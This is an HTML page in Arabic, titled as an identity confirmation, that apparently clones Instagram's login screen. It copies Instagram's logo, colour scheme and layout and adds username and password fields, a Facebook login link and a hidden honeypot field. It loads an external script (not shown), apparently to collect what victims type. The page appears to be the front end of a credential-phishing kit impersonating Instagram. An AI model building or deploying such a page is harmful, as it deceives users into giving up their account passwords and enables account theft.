<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تأكيد هوية</title>
  <style>
    :root { --ig-blue: #0095f6; --ig-border: #dbdbdb; --ig-error: #ed4956; --ig-text: #262626; --ig-grey: #8e8e8e; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .container { background: white; border: 1px solid var(--ig-border); padding: 40px 30px 20px; text-align: center; width: 100%; max-width: 350px; border-radius: 10px; }
    .logo { background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center; background-size: contain; height: 60px; margin: 0 auto 30px; width: 180px; }
    .i_grp { margin-bottom: 6px; position: relative; }
    input { width: 100%; padding: 12px 36px 12px 12px; background: #fafafa; border: 1px solid var(--ig-border); border-radius: 8px; font-size: 12px; height: 44px; direction: ltr; transition: all 0.2s ease; outline: none; }
    input:focus { border-color: var(--ig-grey); }
    .lgn_btn { width: 100%; background: var(--ig-blue); color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; margin: 16px 0; height: 44px; font-size: 14px; cursor: pointer; opacity: 0.7; pointer-events: none; }
    .lgn_btn.active { opacity: 1; pointer-events: auto; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
    .sep { display: flex; align-items: center; color: var(--ig-grey); margin: 18px 0; font-size: 13px; font-weight: 600; }
    .line { flex: 1; height: 1px; background: var(--ig-border); }
    .or_txt { margin: 0 18px; }
    .lnk_sec a { color: var(--ig-blue); font-size: 12px; text-decoration: none; margin: 10px 0; display: block; font-weight: 600; }
    .p_tog { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--ig-text); font-size: 12px; background: none; border: none; padding: 0; font-weight: 600; }
    .e_msg { color: var(--ig-error); font-size: 12px; margin: 8px 0; display: none; }
    .ldr { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid var(--ig-blue); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #v_trap { display: none !important; visibility: hidden; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"></div>
    <form id="v_form_m" novalidate>
      <input type="text" id="v_trap">
      
      <div class="i_grp">
        <input type="text" id="u_99" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
      </div>
      <div class="i_grp">
        <input type="password" id="p_99" placeholder="كلمة المرور" required>
        <button type="button" class="p_tog" id="t_pwd">إظهار</button>
      </div>
      <div class="e_msg" id="e_box">يرجى إدخال بيانات صحيحة!</div>
      <button type="submit" class="lgn_btn" id="b_sub">تسجيل الدخول</button>
      <div class="ldr" id="l_ico"></div>
      
      <div class="sep"><div class="line"></div><span class="or_txt">أو</span><div class="line"></div></div>
      <div class="lnk_sec">
        <a href="https://facebook.com/login"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png" width="16" style="vertical-align: middle; margin-left: 5px;"> تسجيل الدخول باستخدام فيسبوك</a>
        <a href="#" style="color: #00376b; font-size: 11px; margin-top: 20px;">نسيت كلمة المرور؟</a>
      </div>
    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>
